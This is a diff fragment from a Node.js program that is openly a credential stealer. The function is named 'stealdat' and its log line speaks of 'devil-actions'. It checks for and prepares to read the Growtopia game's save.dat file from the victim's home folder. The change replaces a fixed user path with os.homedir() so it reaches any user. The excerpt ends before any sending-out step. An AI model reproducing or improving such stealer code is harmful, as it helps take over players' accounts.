@@ -12,7 +12,7 @@ const fs = require('fs');
 
 // Lets start:D
 function stealdat () {
-    const path = `C:/Users/User-X/AppData/Local/Growtopia/save.dat`
+    const path = `${os.homedir()}/AppData/Local/Growtopia/save.dat`
     if (fs.existsSync(path)) {
     console.log("Lets start this devil-actions.")
     // read it first
